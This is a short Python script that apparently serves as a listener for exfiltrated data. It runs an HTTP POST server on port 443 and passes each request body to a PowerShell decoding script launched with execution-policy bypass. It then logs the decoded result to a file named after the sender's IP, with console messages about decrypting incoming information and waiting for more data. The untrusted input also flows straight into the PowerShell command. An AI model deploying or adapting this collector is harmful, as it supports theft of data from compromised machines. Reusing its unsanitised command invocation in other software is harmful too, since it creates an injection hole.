#!/usr/bin/env python

from http.server import BaseHTTPRequestHandler, HTTPServer
import os
import subprocess

class S(BaseHTTPRequestHandler):
	def _set_headers(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()
	
	def do_POST(self):
		content_length = int(self.headers['Content-Length'])
		post_data = self.rfile.read(content_length)
		ip = self.client_address[0]
		self._set_headers()
		data = post_data.decode('utf-8')
		print("Incoming Connection wait while information is decrypted")
		self.connection.close()
		p = subprocess.Popen (['powershell.exe', '-exe', 'bypass', './decode.ps1', data, 'a'], stdout=subprocess.PIPE, universal_newlines=True,)
		output = p.communicate()[0].strip()
		with open(ip+".txt","a") as f:
			f.writelines("POST request,\nPath: '{0}'\nHeaders: \n'{1}'\n\nBody: \n'{2}'\n".format(str(self.path),str(self.headers),output))
		print("Data written to '{0}' in '{1}'".format(str(ip),str(os.getcwd())))
		print("Keep this server running if you expect more data")
def run(server_class=HTTPServer, handler_class=S, port=443):
	server_address = ('', port)
	httpd = server_class(server_address, handler_class)
	print("Starting POST Server on Port 443")
	try:
		httpd.serve_forever()
	except KeyboardInterrupt:
		pass
	httpd.server_close()
if __name__=='__main__':
	from sys import argv
	if len(argv) == 2:
		run(port=int(argv[1]))
	else:
		run()
